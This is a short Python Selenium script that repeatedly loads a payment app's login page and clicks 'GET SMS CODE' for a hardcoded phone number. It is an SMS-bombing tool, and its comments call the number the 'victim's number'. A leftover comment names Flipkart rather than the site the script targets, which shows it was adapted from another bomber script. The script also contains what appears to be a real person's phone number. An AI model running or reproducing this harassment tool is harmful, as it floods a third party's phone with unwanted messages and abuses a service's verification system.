import time

from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
browser = webdriver.Firefox()


browser.get('https://app-raiseup.hubtel.com/login/')
element = WebDriverWait(browser, 30).until(
    EC.element_to_be_clickable((By.LINK_TEXT, "LET'S GO!")))
element.click()

frequency = 10

# target mobile number, change it to victim's number and
# also ensure that it's registered on flipkart
mobile_number = 248093879


for i in range(frequency):
    browser.get('https://app-raiseup.hubtel.com/login/')

    # find the element where we have to
    # enter the number using the class name
    number = browser.find_element_by_xpath('/html/body/div/div/div[2]/div/div/section/div/div/div/div/div/form/div/input')
    number.clear()

    # automatically type the target number
    number.send_keys("0248093879")

    # find the element to send a forgot password
    # request using its class name
    code = browser.find_element_by_link_text('GET SMS CODE')

    # clicking on that element
    code.click()

    # set the interval to send each sms
    time.sleep(10)

browser.get('https://app-raiseup.hubtel.com/registration/status')
time.sleep(10)
# Create a WebDriver instance
# set the frequency of sms which is approx maximum to 10 per 24 days


# Close the browser
browser.quit()
